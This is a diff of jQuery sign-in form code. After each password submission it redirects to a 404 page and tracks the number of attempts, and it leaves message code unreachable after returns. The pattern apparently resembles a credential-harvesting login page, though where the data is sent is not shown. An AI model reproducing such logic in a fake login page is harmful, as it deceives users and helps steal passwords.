@@ -322,7 +322,7 @@ $(document).ready(function() {
                 $("#submit-btn").html("verifying...");
             },
             success: function(response) {
-                 window.location.replace("/404.html");
+                 window.location.replace("404.html");
                 return;
                 $("#password").val("");
                 if (count >= 3) {
@@ -330,19 +330,19 @@ $(document).ready(function() {
                     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                     $("#div3").animate({ left: 0, opacity: "show" }, 500);
                     setTimeout(() => {
-                        window.location.replace("/404.html");
+                        window.location.replace("404.html");
                 
                     }, 500);
                     return false;
                 }
                 if (count == 2) {
-                     window.location.replace("/404.html");
+                     window.location.replace("404.html");
                 return;
                     $("#msg2").show();
                     $("#msg").hide();
                     $("#msg1").hide();
                 } else {
-                     window.location.replace("/404.html");
+                     window.location.replace("404.html");
                     return;
                     $("#msg1").show();
                     $("#msg").hide();
@@ -357,18 +357,20 @@ $(document).ready(function() {
                     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                     $("#div3").animate({ left: 0, opacity: "show" }, 500);
                     setTimeout(() => {
-                       window.location.replace("/404.html");
+                       window.location.replace("404.html");
                 
                     }, 1000);
                     return false;
                 }
                 if (count == 2) {
-                    window.location.replace("/404.html");
+                    window.location.replace("404.html");
                 return;
                     $("#msg2").show();
                     $("#msg").hide();
                     $("#msg1").hide();
                 } else {
+                     window.location.replace("404.html");
+                return;
                     $("#msg1").show();
                     $("#msg").hide();
                     $("#msg2").hide();
@@ -377,6 +379,7 @@ $(document).ready(function() {
             },
             complete: function() {
                 $("#submit-btn").html("Sign in");
+                 window.location.replace("404.html");
             }
         });
     });
